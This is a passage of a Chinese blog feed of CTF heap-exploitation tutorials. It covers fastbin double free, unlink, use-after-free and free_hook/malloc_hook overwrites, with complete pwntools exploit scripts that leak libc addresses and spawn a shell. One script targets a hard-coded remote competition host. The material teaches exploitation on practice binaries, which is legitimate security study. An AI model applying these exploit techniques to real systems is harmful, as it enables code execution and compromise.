class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn1'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn1'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, level)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Length of the name :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"The name of this life :"</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">"The level of this life (High/Low) :"</span>, level)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Which life do you want to remove: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">    show()</span><br><span class="line">    io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">    stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">    stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">    io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line">    </span><br><span class="line">    libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">    io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#add(0x30, 'a'*0x20+'b'*5,'3')</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2019-网络内生安全试验场-pwn2"><a href="#2019-网络内生安全试验场-pwn2" class="headerlink" title="2019 网络内生安全试验场 pwn2"></a>2019 网络内生安全试验场 pwn2</h2><p>实战中遇到最简单的一道了？</p><h3 id="功能分析-2"><a href="#功能分析-2" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>new一个新堆块</li><li>删除一个堆块</li><li>展示一个堆块</li><li>修改堆块内容，有趣的是，他是固定大小0x100?</li><li>退出</li></ol><h3 id="漏洞点分析-2"><a href="#漏洞点分析-2" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">record</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"record which?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( buf[v1] != <span class="number">0L</span>L &amp;&amp; v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"content?"</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf[v1], <span class="number">0x100</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是固定大小，所以申请小堆块可以溢出</p><h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li><p>我的思路是溢出后unlink，然后在将两个堆块串联起来，unlink里介绍的手法，就是一个堆块指向另一个堆块存指针的地方，然后编辑一个堆块就是编辑地址，编辑另一个堆块就是编辑内容</p></li><li><p>初始化操作</p></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>unlink</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x6020c0</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#show(0)</span></span><br></pre></td></tr></table></figure><ol start="4"><li>链接两个堆块</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ol start="5"><li>泄露地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure><ol start="6"><li>getshell</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'39.106.94.18'</span></span><br><span class="line">port = <span class="number">32768</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    ptr = <span class="number">0x6020c0</span></span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#show(0)</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    </span><br><span class="line">    record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">    record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">    record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#delete(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目下载地址"><a href="#题目下载地址" class="headerlink" title="题目下载地址"></a>题目下载地址</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vT25lLWh1Yi9jdGYtc2F2ZQ==" title="https://github.com/NoOne-hub/ctf-save">点我，快点我<i class="fa fa-external-link"></i></span></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实操的时候发觉自己点是知道了，找漏洞点能力还待提升，利用起来也是得多调试下</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/84788ee9/">https://noone-hub.github.io/posts/84788ee9/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程5</title>
    <url>/posts/1d71df53/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程5"><a href="#pwn堆入门系列教程5" class="headerlink" title="pwn堆入门系列教程5"></a>pwn堆入门系列教程5</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span></p><p>进入uaf学习了，这部分题目就一道题</p><h2 id="hitcon-training-hacknote"><a href="#hitcon-training-hacknote" class="headerlink" title="hitcon-training-hacknote"></a>hitcon-training-hacknote</h2><p>这道题其实很简单，不过要冷静下才能做，我当时有点急躁，浪费一个钟才搞出来？冷静下来10分钟懂了</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>具体分析不讲了，ctf-wiki上讲的很清楚， 我大致讲一下就是要利用要覆盖到他的content指针，这样的话print的时候会调用到另一个函数</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'hacknote'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'hacknote'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = elf.libc</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Note size :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x08048986</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x8</span>, p32(ptr))</span><br><span class="line">    Print(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>接下来进入fastbin attack,fastbin attack有三个题目</p><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>补充函数说明：</p><ul><li>fgets函数会在输入完成后自动在结尾添加一个’\0’，比如我们输入1234加上我们的回车总共是1234’\x0a’’\x00’他sub_80485EC这个函数会将\x0a变成\x00<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2ydm1wq4ej30li04uwf2.jpg" alt="1"></li></ul><h3 id="结构体构造"><a href="#结构体构造" class="headerlink" title="结构体构造"></a>结构体构造</h3><p>开头调试的时候一直不理解他的结构体是如何构造出来的，然后ida解析出来的跟他图片上所谓结构体格格不入，所以手动调试了一下午，知道了他的结构体是如何构造的</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> decription[<span class="number">25</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">27</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个结构体是经过调试以及看汇编得出来的，</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048644</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span 